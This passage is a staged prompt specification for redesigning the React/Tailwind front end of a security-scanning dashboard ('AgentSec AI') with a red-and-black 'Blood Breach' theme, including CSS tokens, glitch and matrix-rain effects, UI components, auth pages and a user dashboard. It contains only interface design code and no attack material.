  page + Mr. Robot's UI design language + Half-Life 2's
  Combine propaganda screens (stark red/black/white, harsh
  condensed type, deliberate visual hostility).

WHAT GETS REMOVED (same discipline as before):
  - All small gray helper subtext under every field
  - Excessive tooltips on hover for basic things
  - Cluttered table column descriptions
  - Multiple competing visual elements per card
  - Dense sidebar with labels on every icon

WHAT STAYS:
  - One number. One label. Full stop.
  - Crimson red used ONLY for meaning — never decoration
  - Motion only at entry, on key state changes, and on
    the two signature glitch/strobe moments
  - Matrix rain ONLY on auth + hero, never on data tables
  - One dominant visual per page

TECH ADDITIONS FOR DESIGN:
  framer-motion       (animations, glitch transitions)
  three.js            (matrix-rain particle field, hero)
  @react-spring/three (spring physics on 3D)
  canvas-confetti     (repurposed as ember/spark burst,
                       not celebratory confetti — see
                       scan-complete section)

Install via:
  npm install framer-motion three @react-spring/three
             canvas-confetti

Fonts (Google Fonts):
  Oswald    — weights 400,500,600,700 (all headlines)
  Anton     — weight 400 only (critical-state emphasis)
  IBM Plex Mono — weights 400,500 (all numbers/data/code)
  Inter     — weights 400,500 (body text, form labels —
              the one "quiet" font so the whole app isn't
              shouting in condensed caps)

Token rule:
Generate in order, wait for "next" between each:
  Step 13.1: Design tokens + global CSS + glitch system
  Step 13.2: Typography system + Tailwind config
  Step 13.3: Matrix rain + strobe/glitch components
  Step 13.4: Core component redesign
  Step 13.5: Login + Register page
  Step 13.6: User Dashboard
  Step 13.7: Live Progress Dashboard
  Step 13.8: Vulnerability Dashboard
  Step 13.9: AI Dashboard
  Step 13.10: Reports Dashboard
  Step 13.11: Verification
```

---

### Step 13.1 — Design Tokens + Global CSS + Glitch System

```
PHASE 13 — STEP 1

Replace: src/index.css (full replacement)

─────────────────────────────────────────

@import url('https://fonts.googleapis.com/css2?
  family=Oswald:wght@400;500;600;700&
  family=Anton&
  family=Inter:wght@400;500;600&
  family=IBM+Plex+Mono:wght@400;500&
  display=swap');

@tailwind base;
@tailwind components;
@tailwind utilities;

/* ── DESIGN TOKENS — "BLOOD BREACH" ─────────────────── */

:root {

  /* Backgrounds — true near-black, no blue undertone */
  --bg-void:       #000000;
  --bg-base:       #050505;
  --bg-surface:    #0A0A0A;
  --bg-elevated:   #101010;
  --bg-overlay:    #161616;

  /* Borders */
  --border-subtle:  rgba(255,255,255,0.05);
  --border-default: rgba(255,255,255,0.09);
  --border-strong:  rgba(255,255,255,0.16);

  /* Text */
  --text-primary:   #F5F5F0;
  --text-secondary: #8A8A85;
  --text-muted:     #454540;

  /* Brand — Blood Red, the ONLY accent color in the app */
  --brand:          #E10600;
  --brand-bright:   #FF1A1A;
  --brand-glow:     rgba(225,6,0,0.35);
  --brand-subtle:   rgba(225,6,0,0.08);

  /* Severity — red is reserved for brand/critical, so
     the severity ramp below CRITICAL uses non-red hues
     to keep red meaning ONE thing in the whole app */
  --critical:       #E10600;
  --critical-glow:  rgba(225,6,0,0.4);
  --critical-subtle:rgba(225,6,0,0.1);

  --high:           #FF6A00;
  --high-subtle:    rgba(255,106,0,0.08);

  --medium:         #E8B800;
  --medium-subtle:  rgba(232,184,0,0.07);

  --low:            #4A9E5C;
  --low-subtle:     rgba(74,158,92,0.07);

  --info:           #5B8DBE;
  --info-subtle:    rgba(91,141,190,0.07);

  /* Status */
  --status-running: #5B8DBE;
  --status-done:    #4A9E5C;
  --status-failed:  #E10600;
  --status-paused:  #E8B800;

  /* Blackout Siege — critical-only palette */
  --siege-black:    #000000;
  --siege-white:    #FFFFFF;
  --siege-flash:    rgba(255,255,255,0.12);

  /* Radius — sharper corners than a typical SaaS app,
     this system is not friendly, it's clinical */
  --radius-sm:  4px;
  --radius-md:  6px;
  --radius-lg:  10px;
  --radius-xl:  14px;

  /* Shadows */
  --shadow-card:
    0 0 0 1px rgba(255,255,255,0.06),
    0 4px 20px rgba(0,0,0,0.6);
  --shadow-glow-brand:
    0 0 36px rgba(225,6,0,0.25);
  --shadow-glow-critical:
    0 0 44px rgba(225,6,0,0.4);

  /* Fonts */
  --font-headline: 'Oswald', sans-serif;
  --font-emphasis: 'Anton', sans-serif;
  --font-body:     'Inter', sans-serif;
  --font-mono:     'IBM Plex Mono', monospace;
}

/* ── BASE ───────────────────────────────────────────── */

* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

html {
  font-size: 16px;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

body {
  background: var(--bg-void);
  color: var(--text-primary);
  font-family: var(--font-body);
  font-weight: 400;
  line-height: 1.5;
  overflow-x: hidden;
}

h1, h2, h3, h4, .headline {
  font-family: var(--font-headline);
  text-transform: uppercase;
  letter-spacing: 0.01em;
}

.font-emphasis {
  font-family: var(--font-emphasis);
  text-transform: uppercase;
  letter-spacing: 0.02em;
  font-weight: 400; /* Anton only ships as 400 */
}

/* ── SCROLLBAR ──────────────────────────────────────── */

::-webkit-scrollbar { width: 4px; height: 4px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb {
  background: rgba(225,6,0,0.25);
  border-radius: 2px;
}
::-webkit-scrollbar-thumb:hover {
  background: rgba(225,6,0,0.5);
}

/* ── GLASS ──────────────────────────────────────────── */

.glass {
  background: rgba(255,255,255,0.025);
  border: 1px solid rgba(255,255,255,0.07);
  backdrop-filter: blur(16px);
  -webkit-backdrop-filter: blur(16px);
}

/* ── GLOW ───────────────────────────────────────────── */

.glow-brand    { box-shadow: var(--shadow-glow-brand); }
.glow-critical { box-shadow: var(--shadow-glow-critical); }

/* ── GRADIENT TEXT (used sparingly — brand only) ─────── */

.gradient-text-brand {
  background: linear-gradient(135deg, #FF3B30, #E10600, #A80000);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}

/* ── SCATTERED STATIC LINES (Blackout Siege texture) ── */
/* Applied to .siege-surface — thin, static, low opacity
   horizontal lines. Randomized positions are set inline
   via a JS-generated background-image at render time
   (see StaticLines.jsx component in Step 13.3). This CSS
   just defines the container behavior. */

.siege-surface {
  position: relative;
  background: var(--siege-black);
  overflow: hidden;
}

.siege-surface::before {
  content: '';
  position: absolute;
  inset: 0;
  pointer-events: none;
  opacity: 0.5;
  /* actual line pattern injected via inline style per
     instance so every siege surface looks distinct */
}

/* ── STROBE FLASH (ONE-SHOT, WCAG-SAFE) ──────────────── */
/* Never loop this. Trigger once via framer-motion, not
   via CSS animation, so it can never accidentally repeat.
   This keyframe exists only as a fallback/reference; the
   actual trigger is a single framer-motion animate call
   documented in Step 13.3's CriticalStrobe component. */

@keyframes strobe-once {
  0%   { opacity: 0; }
  15%  { opacity: 1; }
  100% { opacity: 0; }
}

/* ── GLITCH SCAN-BAR TEAR ─────────────────────────────── */
/* A thin horizontal strip of the screen displaces
   sideways for one frame then snaps back. Implemented
   as a clip-path animation, triggered rarely and briefly
   (150-250ms total), never looping. */

@keyframes scan-tear {
  0%   { clip-path: inset(0 0 100% 0); transform: translateX(0); }
  2%   { clip-path: inset(38% 0 58% 0); transform: translateX(-6px); }
  4%   { clip-path: inset(38% 0 58% 0); transform: translateX(4px); }
  6%   { clip-path: inset(38% 0 58% 0); transform: translateX(0); }
  100% { clip-path: inset(0 0 100% 0); transform: translateX(0); }
}

.glitch-tear-once {
  animation: scan-tear 220ms steps(2, end) 1;
}

/* ── MATRIX RAIN CONTAINER (hero/auth only) ──────────── */

.matrix-rain-layer {
  position: absolute;
  inset: 0;
  opacity: 0.055;
  pointer-events: none;
  mix-blend-mode: screen;
}

/* ── ANIMATIONS (persistent, low-key) ───────────────── */

@keyframes pulse-dot {
  0%, 100% { opacity: 1; transform: scale(1); }
  50%       { opacity: 0.45; transform: scale(0.82); }
}

@keyframes shimmer {
  0%   { background-position: -200% 0; }
  100% { background-position: 200% 0; }
}

/* ── SELECTION ──────────────────────────────────────── */

::selection {
  background: rgba(225,6,0,0.35);
  color: #fff;
}

/* ── REDUCED MOTION — disables ALL signature effects ─── */

@media (prefers-reduced-motion: reduce) {
  *, ::before, ::after {
    animation-duration: 0.01ms !important;
    transition-duration: 0.01ms !important;
  }
  .matrix-rain-layer,
  .glitch-tear-once,
  .siege-surface::before {
    display: none !important;
  }
}

Generate src/index.css only. Stop after.
```

---

### Step 13.2 — Typography System + Tailwind Config

```
PHASE 13 — STEP 2

Generate full replacement:
  tailwind.config.js
  src/styles/typography.js

─────────────────────────────────────────

tailwind.config.js:

/** @type {import('tailwindcss').Config} */
export default {
  content: ['./index.html', './src/**/*.{js,jsx}'],
  darkMode: 'class',
  theme: {
    extend: {

      colors: {
        void:     '#000000',
        base:     '#050505',
        surface:  '#0A0A0A',
        elevated: '#101010',
        overlay:  '#161616',

        brand: {
          DEFAULT: '#E10600',
          bright:  '#FF1A1A',
          subtle:  'rgba(225,6,0,0.08)',
          glow:    'rgba(225,6,0,0.35)',
        },

        critical: {
          DEFAULT: '#E10600',
          subtle:  'rgba(225,6,0,0.1)',
          glow:    'rgba(225,6,0,0.4)',
        },
        high: {
          DEFAULT: '#FF6A00',
          subtle:  'rgba(255,106,0,0.08)',
        },
        medium: {
          DEFAULT: '#E8B800',
          subtle:  'rgba(232,184,0,0.07)',
        },
        low: {
          DEFAULT: '#4A9E5C',
          subtle:  'rgba(74,158,92,0.07)',
        },
        info: {
          DEFAULT: '#5B8DBE',
          subtle:  'rgba(91,141,190,0.07)',
        },

        siege: {
          black: '#000000',
          white: '#FFFFFF',
        },
      },

      fontFamily: {
        headline: ['Oswald', 'sans-serif'],
        emphasis: ['Anton', 'sans-serif'],
        sans:     ['Inter', 'system-ui', 'sans-serif'],
        mono:     ['IBM Plex Mono', 'monospace'],
      },

      fontSize: {
        '2xs': ['0.625rem', { lineHeight: '1rem' }],
        xs:    ['0.75rem',  { lineHeight: '1rem' }],
        sm:    ['0.875rem', { lineHeight: '1.25rem' }],
        base:  ['1rem',     { lineHeight: '1.5rem' }],
        lg:    ['1.125rem', { lineHeight: '1.75rem' }],
        xl:    ['1.25rem',  { lineHeight: '1.75rem' }],
        '2xl': ['1.5rem',   { lineHeight: '1.15' }],
        '3xl': ['1.875rem', { lineHeight: '1.1' }],
        '4xl': ['2.25rem',  { lineHeight: '1.05' }],
        '5xl': ['3rem',     { lineHeight: '1' }],
        '6xl': ['3.75rem',  { lineHeight: '1' }],
        '7xl': ['4.5rem',   { lineHeight: '0.95' }],
        '8xl': ['6rem',     { lineHeight: '0.9' }],
        '9xl': ['8rem',     { lineHeight: '0.9' }],
      },

      borderRadius: {
        sm: '4px',
        md: '6px',
        lg: '10px',
        xl: '14px',
        '2xl': '20px',
      },

      boxShadow: {
        card:
          '0 0 0 1px rgba(255,255,255,0.06), 0 4px 20px rgba(0,0,0,0.6)',
        glow:
          '0 0 36px rgba(225,6,0,0.25)',
        'glow-critical':
          '0 0 44px rgba(225,6,0,0.4)',
        'glow-sm':
          '0 0 18px rgba(225,6,0,0.15)',
      },

      animation: {
        'pulse-dot':  'pulse-dot 2s ease-in-out infinite',
        'shimmer':    'shimmer 2s linear infinite',
      },

      letterSpacing: {
        widest2: '0.22em',
      },

    },
  },
  plugins: [
    require('@tailwindcss/forms'),
  ],
}

─────────────────────────────────────────

src/styles/typography.js:

// Design token exports — the "voice" of the app.
// Oswald = shouting a headline. Anton = shouting ONE word
// during a critical moment. Inter = the quiet baseline for
// anything the user needs to actually read comfortably.
// IBM Plex Mono = every number, every piece of data.

export const TYPE = {
  // Headlines — condensed, uppercase, industrial
  headline:  'font-headline uppercase tracking-wide',
  
  // Emphasis — reserved ONLY for critical-state moments
  // ("BREACH DETECTED", "CRITICAL", scan-complete-with-
  // criticals screen). Never use for routine headings.
  emphasis:  'font-emphasis uppercase tracking-wide',

  // Body — the one readable, human font in the app
  body:      'font-sans font-normal leading-relaxed',
  caption:   'font-sans font-normal text-sm text-secondary',

  // Data — numbers, code, IDs, timestamps
  mono:      'font-mono font-normal',
  stat:      'font-mono font-medium tabular-nums',
  badge:     'font-sans font-semibold text-xs uppercase tracking-wide',
}

export const SEVERITY_CONFIG = {
  CRITICAL: {
    label:  'Critical',
    color:  '#E10600',
    bg:     'rgba(225,6,0,0.1)',
    border: 'rgba(225,6,0,0.3)',
    glow:   'rgba(225,6,0,0.4)',
    dot:    'bg-critical',
    // CRITICAL is the ONLY severity that triggers the
    // Blackout Siege treatment (Anton font, strobe-once,
    // stark black/white card) — see components in 13.3/13.4
    siege: true,
  },
  HIGH: {
    label:  'High',
    color:  '#FF6A00',
    bg:     'rgba(255,106,0,0.08)',
    border: 'rgba(255,106,0,0.2)',
    dot:    'bg-high',
    siege: false,
  },
  MEDIUM: {
    label:  'Medium',
    color:  '#E8B800',
    bg:     'rgba(232,184,0,0.07)',
    border: 'rgba(232,184,0,0.18)',
    dot:    'bg-medium',
    siege: false,
  },
  LOW: {
    label:  'Low',
    color:  '#4A9E5C',
    bg:     'rgba(74,158,92,0.07)',
    border: 'rgba(74,158,92,0.15)',
    dot:    'bg-low',
    siege: false,
  },
  INFO: {
    label:  'Info',
    color:  '#5B8DBE',
    bg:     'rgba(91,141,190,0.07)',
    border: 'rgba(91,141,190,0.12)',
    dot:    'bg-info',
    siege: false,
  },
}

Generate both files. Stop after.
```

---

### Step 13.3 — Matrix Rain + Strobe/Glitch Components

```
PHASE 13 — STEP 3

Generate these signature effect components.
These are used sparingly and deliberately — reference
them from specific pages only, never globally mounted.

─────────────────────────────────────────

src/components/effects/MatrixRain.jsx:

Purpose: falling glyph rain, used ONLY behind the auth
screens (Login/Register) and the User Dashboard hero.
NEVER on data-dense screens (tables, findings, reports) —
it would hurt legibility and contradict the "silent
except when it matters" rule.

Implementation (Three.js, not DOM-based — GPU renders it
so it never touches the JS main thread the app needs for
data updates):

  Scene setup:
    Orthographic camera, full viewport
    A grid of columns (viewport width / 18px column width)
    Each column: a vertical stream of glyphs (katakana-style
      Unicode range U+30A0–U+30FF mixed with 0/1 binary,
      rendered onto a canvas texture, mapped onto a plane)
    
    Each column falls at a randomized speed (2-6s per
    full-screen traverse), resets to top when off-screen
    
    Color: brand red (#E10600) at full texture opacity,
    but the WHOLE canvas element is composited into the
    page at 5.5% opacity via the .matrix-rain-layer CSS
    class — this keeps it a texture, not a distraction
    
    Leading glyph per column: slightly brighter
    (#FF6A5A) to simulate a "head" to the rain stream,
    same trick classic Matrix rain effects use
    
  Performance:
    Single shared canvas texture atlas (not one texture
    per glyph) to avoid draw call explosion
    Pause the render loop entirely when the tab is not
    visible (document.visibilityState)
    Cap to 30fps internally (rain doesn't need 60fps,
    saves battery/CPU on laptops)

  Respect prefers-reduced-motion: component returns null
  entirely (renders a static single low-opacity red
  gradient instead) if the media query matches.

Props: className, density ('sparse' | 'normal' | 'dense')
  Auth screens: density='normal'
  Dashboard hero: density='sparse' (this is a background
    texture there, not a focal element)

─────────────────────────────────────────

src/components/effects/ScanTear.jsx:

Purpose: the one-shot horizontal glitch "tear" — a thin
strip of whatever's behind it displaces sideways for a
single 220ms burst, then snaps back perfectly.

Triggers (each is a DELIBERATE, RARE moment — never on
every render, never looping):
  1. On initial mount of the Login page (announces the
     app, once, on load)
  2. When a WebSocket 'finding_found' event arrives with
     severity === 'CRITICAL' (the screen "flinches")
  3. When a scan transitions to 'scan_complete' status

Implementation:
  A React component wrapping its children:
    <ScanTear trigger={triggerBool}>
      {children}
    </ScanTear>
  
  On trigger going from false → true:
    Adds the CSS class `.glitch-tear-once` to a ref'd
    wrapper div for exactly 220ms (matches the CSS
    animation duration), then removes it — this ensures
    the animation can fire again on a LATER distinct
    trigger without needing to unmount/remount.
  
  Use a useEffect keyed on the trigger prop:
    useEffect(() => {
      if (!trigger) return
      el.classList.add('glitch-tear-once')
      const t = setTimeout(() => 
        el.classList.remove('glitch-tear-once'), 240)
      return () => clearTimeout(t)
    }, [trigger])

  Respect prefers-reduced-motion: if matched, the effect
  never adds the class at all — trigger prop is ignored.

─────────────────────────────────────────

src/components/effects/CriticalStrobe.jsx:

Purpose: the Blackout Siege signature moment. Fires
EXACTLY ONCE per critical event — a full-viewport white
overlay flashes to a maximum of 12% opacity for ~150ms
then fades to 0 and never repeats for that event.

WCAG SAFETY (hard rule, do not deviate):
  - Single flash only. No loop. No re-trigger without a
    genuinely new critical event (keyed by finding ID).
  - Peak opacity capped at 0.12 — this is a flicker, not
    a flash. Never approach full white.
  - Total duration under 300ms.
  - If prefers-reduced-motion is set, this component
    renders nothing and the critical moment is instead
    communicated by a static red border pulse (CSS
    .animate-pulse-dot on the relevant element) which is
    exempted from the reduced-motion media query override
    because pulse-dot is a slow, gentle opacity change,
    not a flash.

Implementation (framer-motion, single imperative trigger,
NOT a CSS keyframe loop — this guarantees exactly-once):

  const controls = useAnimation()
  
  useEffect(() => {
    if (!newCriticalFindingId) return
    if (prefersReducedMotion) return
    controls.start({
      opacity: [0, 0.12, 0],
      transition: { duration: 0.15, times: [0, 0.3, 1] }
    })
  }, [newCriticalFindingId])
  
  Render: a fixed, full-viewport, pointer-events-none
  <motion.div> with bg-white, animate={controls}

  Track "already flashed for this ID" in a ref Set so the
  same finding can never re-trigger the strobe even if
  the parent re-renders.

─────────────────────────────────────────

src/components/effects/StaticLines.jsx:

Purpose: the Blackout Siege texture — scattered, static
(non-animated) thin horizontal lines at very low opacity,
used as a background texture on CRITICAL-context surfaces
(a critical finding's overlay panel, the "scan complete
with criticals" screen).

Implementation:
  A pure function generating an inline SVG or CSS
  background-image with N randomly-y-positioned 1px lines
  at 4-7% white opacity, seeded once per component mount
  (useMemo, not regenerated on every render — these must
  stay static, motion here would defeat the "siege" stillness).

  export function useStaticLinesBackground(lineCount = 14) {
    return useMemo(() => {
      const lines = Array.from({ length: lineCount }, () => ({
        y: Math.random() * 100,
        opacity: 0.03 + Math.random() * 0.04
      }))
      const gradientStops = lines.map(l =>
        `linear-gradient(rgba(255,255,255,${l.opacity}),
         rgba(255,255,255,${l.opacity})) 0 ${l.y}% / 100% 1px
         no-repeat`
      ).join(', ')
      return { backgroundImage: gradientStops }
    }, [lineCount])
  }

  Usage: apply the returned style object directly to a
  container's style prop. Zero animation, zero JS after
  mount — this is intentionally the "calm after the
  strobe" companion effect.

Generate all 4 files. Stop after.
```

---

### Step 13.4 — Core Component Redesign

```
PHASE 13 — STEP 4

Generate these files in one response.

─────────────────────────────────────────

src/components/ui/StatCard.jsx:

Props: value, label, icon, trend, color, isCritical

Design rules:
  - ONE large number in IBM Plex Mono. ONE label in
    Oswald uppercase, small, tracked-wide. Nothing else.
  - Number animates up from 0 on mount (900ms ease-out)
  - Standard cards: bg-elevated, thin border, sharp
    (6px) radius — no soft rounded-SaaS-corner feel
  - If isCritical AND value > 0:
      Card switches to Blackout Siege treatment:
        bg-siege-black, border: 1px solid white/20
        Number renders in font-emphasis (Anton) instead
        of font-mono, still using the numeric value
        Number color: pure white, with a subtle red
        text-shadow (0 0 24px rgba(225,6,0,0.5))
        On mount (first time value transitions 0 → >0
        within this session): trigger <CriticalStrobe />
        scoped to just this card's bounding box (position:
        relative on card, absolute strobe overlay inside)
  - Hover (non-critical cards only): border-brand/25,
    lift 3px, glow-sm
  - Critical cards do NOT lift on hover — stillness is
    the point, per Blackout Siege's "siege" stillness

Layout:
  Top-left: small dot (color) + label
    text-2xs font-headline uppercase tracking-widest2
    text-secondary (text-white/70 if siege)
  Center: stat number
    text-6xl md:text-7xl
    font-mono normally, font-emphasis if siege
  Bottom-right: trend arrow (non-siege cards only —
    a critical count trending anywhere is not a moment
    for a cheerful up/down arrow, omit entirely on siege)

Animated counter hook (useCountUp):
  requestAnimationFrame, 900ms, ease-out-cubic
  Starts on IntersectionObserver entry

Motion (framer-motion):
  Initial: { opacity: 0, y: 14 }
  Animate: { opacity: 1, y: 0 }, duration 0.35s

─────────────────────────────────────────

src/components/ui/SeverityBadge.jsx:

Two variants: pill (table rows) and large (headers).

pill variant:
  9px colored square (NOT circle — squares read as more
  "system alert," circles read as more "friendly status")
  + text-xs font-mono uppercase, no background

large variant:
  CRITICAL: renders using Blackout Siege styling —
    bg-siege-black, border: 1px solid white,
    text in font-emphasis, letter-spacing wide,
    a single thin red underline beneath the word
  HIGH/MEDIUM/LOW/INFO: standard tinted pill,
    bg = severity.bg, border = severity.border,
    text = font-headline uppercase tracking-wide,
    text-xs, no glow

─────────────────────────────────────────

src/components/ui/Button.jsx:

Four variants:

primary:
  bg-brand, text-white, font-headline uppercase
  tracking-wide, sharp 4px radius (not 8px — buttons
  should feel stamped, not soft)
  Hover: bg-brand-bright, scale 1.01
  Active: scale 0.98
  Loading: spinner only replaces label

ghost:
  Transparent, text-primary, font-headline uppercase
  Hover: bg-white/5

outline:
  1px border-white/12, transparent bg
  Hover: border-white/25, bg-white/3

danger (used for destructive actions, e.g. cancel scan):
  bg-black, border: 1px solid brand, text-brand
  font-emphasis (Anton) — this is the one non-primary
  button allowed to use the shouting font, because a
  destructive action deserves the weight
  Hover: bg-brand/10

ALL buttons: transition 150ms ease, NO box-shadow except
primary on hover (subtle glow-sm)

─────────────────────────────────────────

src/components/ui/Input.jsx:

bg-surface, border 1px solid white/8, radius 4px (sharp)
Label (if shown): font-headline uppercase text-2xs
  tracking-widest2 text-secondary, positioned above field
On focus: border-brand, no ring glow (keep it stark)
Placeholder: text-muted, font-sans (not headline —
  placeholders should read as quiet hints, not shouts)
Error state: border-critical, error text below in
  text-critical text-sm font-sans (readable, not shouted)

─────────────────────────────────────────

src/components/ui/Modal.jsx:

Overlay: bg-black/85, backdrop-blur-md
Panel: bg-elevated, border 1px solid white/8, radius 8px
Header title: font-headline uppercase text-xl
No drop shadow — border carries separation
Entry (framer-motion): opacity 0, scale 0.97, y 6 →
  opacity 1, scale 1, y 0, spring stiffness 480 damping 38

If the modal represents a CRITICAL context (e.g. "confirm
delete of a critical finding," an active-breach alert
modal): apply .siege-surface class + useStaticLinesBackground()
to the panel, title renders in font-emphasis instead of
font-headline.

─────────────────────────────────────────

src/components/layout/Sidebar.jsx:

Width: 64px collapsed, 216px expanded
bg-surface, border-right 1px white/6

Nav items: icon (18px Lucide) + label (font-headline
  uppercase text-sm tracking-wide when expanded)
Default: text-secondary
Hover: text-primary, bg-white/4
Active: text-brand, bg-brand/8, left border 2px solid brand
  (the ONLY red most of the sidebar ever shows — restraint)

Active scan indicator: small pulsing red dot next to
  "Scans" nav item (animate-pulse-dot, gentle, exempted
  from reduced-motion since it's a slow status pulse not
  a flash)

Bottom: user avatar circle, initials in font-mono
On click: dropdown with Profile + Logout only

─────────────────────────────────────────

src/components/layout/Navbar.jsx:

height 56px, bg-surface/85, backdrop-blur-md
border-bottom 1px white/6, sticky top-0

Left: page title, font-headline uppercase text-lg
Right (3 max): notification bell (badge count),
  theme toggle, user avatar dropdown
NO search bar, NO extra buttons

─────────────────────────────────────────

src/components/ui/ProgressBar.jsx:

Track: bg-white/5, height 5px, radius 0 (perfectly
  square ends — reads as a system meter, not a soft UI bar)
Fill: bg-brand, animated width transition 600ms spring
NO percentage label on the bar itself
Active/running state: subtle shimmer (background-size
  200% animate-shimmer 2s linear infinite) — this is a
  persistent quiet animation, allowed under reduced-motion
  exemption since it communicates active state, not
  decoration; but STILL respect the global reduced-motion
  override which disables it along with everything else,
  per the CSS media query already written in Step 13.1

─────────────────────────────────────────

src/components/ui/Skeleton.jsx:

background: linear-gradient(90deg, bg-elevated 25%,
  bg-overlay 50%, bg-elevated 75%), background-size 200%,
  animate-shimmer 1.5s infinite, radius 4px
Variants: text, block, circle

─────────────────────────────────────────

src/components/tables/DataTable.jsx:

thead: no background, border-bottom 1px white/6
th: font-headline uppercase text-2xs tracking-widest2
  text-secondary
tr: border-bottom 1px white/4, hover bg-white/2
td: text-sm font-sans text-primary (NOT font-headline —
  table data must stay quiet/readable, headlines are for
  headers and hero moments only)

NO zebra striping, NO row backgrounds by default.

If a row represents a CRITICAL finding: left border 2px
  solid brand on that specific <tr>, and the severity
  cell renders the siege-styled badge — this is the ONLY
  per-row visual escalation allowed, kept extremely
  restrained so a table full of findings doesn't turn
  into visual noise.

Search bar: bg-surface, border 1px white/8, radius 4px,
  placeholder font-sans "Search..."

Pagination: bottom-right, "24 / 157" font-mono text-sm +
  prev/next chevrons, no page-number buttons

Generate all files. Stop after.
```

---

### Step 13.5 — Login + Register Page

```
PHASE 13 — STEP 5

Generate: src/pages/auth/LoginPage.jsx
          src/pages/auth/RegisterPage.jsx

─────────────────────────────────────────

LoginPage.jsx:

Full viewport, two columns (desktop) / single (mobile).

LEFT COLUMN (60% width):
  bg-void, relative positioning for layered effects.
  
  Layer 1 (bottom): <MatrixRain density="normal" />
    absolutely positioned, full-fill, .matrix-rain-layer
  
  Layer 2: a radial vignette — bg-void fading to
    transparent from the edges inward, so the rain is
    denser-feeling at the edges and clearer where the
    text sits, via a radial-gradient overlay div
  
  Layer 3 (content, wrapped in <ScanTear trigger={true}
    on mount>):
    
    Top-left: "AGENTSEC AI" 
      font-headline uppercase text-xl tracking-widest2
      text-white
    
    Bottom-left text block:
      "ATTACK SURFACE."
        font-headline uppercase font-bold text-6xl
        text-white, line-height 0.95
      "BREACHED OR NOT."
        Same size, gradient-text-brand class
        (the crimson gradient defined in index.css)
      
      Below (generous margin, 24px):
        "Autonomous reconnaissance. Zero manual effort."
        font-sans text-secondary text-base
        (deliberately the ONE sans-serif quiet line on
        an otherwise all-caps screaming screen — it's the
        moment the app "speaks normally" for one sentence)

RIGHT COLUMN (40% width):
  bg-surface, border-left 1px solid white/6
  Centered vertically.
  
  TOP: "SIGN IN" — font-headline uppercase text-3xl
  No subtitle.
  
  Form (32px gap between fields):
    Email input (48px height, label above: "EMAIL")
    Password input (eye toggle icon, label: "PASSWORD")
    
    "Forgot password?" — font-sans text-secondary text-sm
      right-aligned
    
    Submit button:
      Full width, 48px height, variant="primary"
      Label: "CONTINUE" (font-headline, per Button spec)
      Loading: spinner only
    
    Divider: thin line, "OR" center, font-headline
      text-muted text-xs tracking-widest2
    
    "New here?" font-sans text-secondary text-sm centered
    "Create an account" — text-brand text-sm, font-sans

  Error state: border-critical on the field, one line
    error text below in text-critical text-sm font-sans

Entry animation (framer-motion):
  Form container: initial y:20 opacity:0, animate y:0
    opacity:1, staggerChildren 0.06s, duration 0.45s
  On mount, the LEFT column's <ScanTear> fires once —
    the screen visibly "glitches in" for 220ms as the
    login page first appears

─────────────────────────────────────────

RegisterPage.jsx:

Same two-column structure.

LEFT COLUMN:
  <MatrixRain density="dense" /> — slightly denser rain
    than login, signals "creating access" vs "returning"
  Headline block:
    "REQUEST" (font-headline text-6xl text-white)
    "CLEARANCE." (gradient-text-brand)
  Subtext (font-sans, quiet): "One account. Full visibility."

RIGHT COLUMN:
  "CREATE ACCOUNT" — font-headline uppercase text-3xl
  
  Fields (24px gap): Username, Email, Password (+
    strength bar), Confirm handled inline via validation
  
  Password strength bar: 4 segments, 4px height, 8px gap
    Empty: bg-white/5
    Scores map to brand-family progression instead of a
    traditional green ramp, since green doesn't exist in
    this palette outside LOW severity:
      Score 1: bar[0] = critical red
      Score 2: bars[0,1] = high orange
      Score 3: bars[0,1,2] = medium yellow
      Score 4: all 4 bars = low green
    (Reusing the severity ramp for password strength is
    intentional — the app has one consistent color
    vocabulary for "how bad/good is this," reused here.)
    NO text label — the bar communicates it.
  
  Submit: "GET STARTED" full width, variant="primary"

  "Already have an account?" → Sign in link

Generate both files. Stop after.
```

---

### Step 13.6 — User Dashboard

```
PHASE 13 — STEP 6

Generate: src/pages/dashboard/UserDashboard.jsx

─────────────────────────────────────────

HERO SECTION (full width, 200px height):

  bg-surface, border-bottom 1px white/6
  padding 48px/40px
  
  Behind everything: <MatrixRain density="sparse" />
    at reduced opacity via a wrapping div with
    opacity: 0.6 applied on top of the component's own
    5.5% base — total effect is barely-there texture,
    a heartbeat rather than a visual
  
  Left:
    "GOOD MORNING, {USERNAME.toUpperCase()}."
    font-headline uppercase text-4xl text-white
    
    Below (16px): date, font-sans text-secondary text-base
      (quiet line again — the one moment of calm text)
  
  Right:
    "NEW SCAN" button (primary, lg)
    Input slides in from right on click (framer-motion),
    placeholder font-sans "Enter domain or IP"
      (input text stays sans-serif — you don't want a
      user's typed domain rendered in shouting caps)

─────────────────────────────────────────

STAT ROW (4 cards, 28px gap):

Uses the redesigned StatCard from Step 13.4 directly:

  Card 1: TOTAL SCANS — standard treatment
  Card 2: FINDINGS — standard treatment, number in
    gradient-text-brand if count > 0
  Card 3: CRITICAL — isCritical={true} passed to StatCard
    → this is the one card that can flip into full
    Blackout Siege mode with the strobe-once effect when
    the count first becomes > 0 in the session
  Card 4: RISK SCORE — standard, color ramps through the
    severity palette based on score (green low→red high)

─────────────────────────────────────────

RECENT SCANS TABLE (mt-10):

Header: "RECENT SCANS" font-headline uppercase text-xl
Right: "VIEW ALL →" text-brand text-sm font-headline

Table columns: Target | Status | Risk | Findings | Date
  Target: font-mono text-primary
  Status: colored dot + status word (font-sans, not caps
    — status words like "running"/"completed" read
    better lowercase even in this aesthetic)
  Risk: colored font-mono number
  Findings: font-mono number, gradient-text-brand if
    critical count > 0 in that scan
  Date: font-sans text-secondary "3h ago"

Row click → scan detail. Rows with a critical finding
  get the left-border-2px-brand treatment from DataTable.

─────────────────────────────────────────

ACTIVE SCANS SECTION (only if running scans exist):

bg-brand/5, border 1px solid brand/15, radius 10px
Left: pulsing red dot + target (font-mono)
Center: thin progress bar + phase name (font-sans, small)
Right: "WATCH →" ghost button (font-headline)

NO tips, NO AI recommendations widget, NO welcome cards.
Clean. Just data, with exactly one card capable of
escalating visually when it matters.

Generate UserDashboard.jsx only. Stop after.
```

---

### Step 13.7 — Live Progress Dashboard

```
PHASE 13 — STEP 7

Generate: src/pages/scans/LiveProgressDashboard.jsx

─────────────────────────────────────────

LAYOUT: two columns (70% / 30%), same structure as before,
